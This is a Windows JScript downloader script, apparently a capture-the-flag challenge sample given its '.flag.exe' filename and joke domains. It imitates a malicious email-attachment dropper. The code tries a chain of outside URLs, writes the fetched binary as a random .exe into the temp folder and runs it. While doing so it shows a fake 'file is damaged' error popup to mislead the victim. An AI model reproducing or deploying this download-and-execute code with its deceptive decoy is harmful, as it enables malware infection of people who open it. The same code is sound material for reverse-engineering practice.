function getDataFromUrl(url, callback) {
	try {
		var xmlHttp = new ActiveXObject("MSXML2.XMLHTTP");
		xmlHttp.open("GET", url, false);
		xmlHttp.send();
		if (xmlHttp.status == 200) {return callback(xmlHttp.ResponseBody, false); } 
		else {return callback(null, true);}
	} catch (error) {return callback(null, true); }
}

function getData(callback) {
	try {
		getDataFromUrl("http://r.u.kidding.me69/DAB58154yc/", function(result, error) {
			if ( ! error) {return callback(result, false); } 
			else {
				getDataFromUrl("http://shall.we.playctfga.me69/ni95716oSOsA/", function(result, error) {
					if ( ! error) {return callback(result, false); } 
					else {
						getDataFromUrl("http://omgwtfbbq.no69/VqCj49674sPnb/", function(result, error) {
							if ( ! error) {return callback(result, false); } 
							else {
								getDataFromUrl("http://nono.thiscannot.be69/Isb50659TZdS/", function(result, error) {
									if ( ! error) {return callback(result, false); } 
									else {
										getDataFromUrl("http://reversing.sg/pdfHWP/part1.flag.exe", function(result, error) {
											if ( ! error) {return callback(result, false); } 
											else {return callback(null, true); }
										});
									} 
								}); 
							} 
						});
					} 
				});
			} 
		}); 
	} 
	catch (error) {return callback(null, true); }
} 

function getTempFilePath() {
	try { 
		var fs = new ActiveXObject("Scripting.FileSystemObject");
		var tmpFileName = "\\" + Math.random().toString(36).substr(2, 9) +".exe";
		var tmpFilePath = fs.GetSpecialFolder(2) + tmpFileName;
		return tmpFilePath; 
	} 
	catch (error) {return false; }
} 

function saveToTemp(data, callback) {
	try {
		var path = getTempFilePath(); 
		if (path) {
			var objStream = new ActiveXObject("ADODB.Stream");
			objStream.Open();
			objStream.Type = 1;
			objStream.Write(data);
			objStream.Position = 0;
			objStream.SaveToFile(path, 2);
			objStream.Close();
			return callback(path, false); 
		} 
		else {return callback(null, true); }
	} 
	catch (error) {return callback(null, true); }
} 

getData(function(data, error) {
	WshShell = WScript.CreateObject("WScript.Shell"); 
	Text = "There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and was not correctly decoded).";
	Title = "Not Supported File Format";
	Res = WshShell.Popup(Text, 0, Title, 0 + 64);
	if ( ! error) {
		saveToTemp(data, function(path, error) {
			if ( ! error) {
				try {
					var wsh = new ActiveXObject("WScript.Shell");
					wsh.Run(path);
				} 
				catch (error){}
			} 
		}); 
	} 
});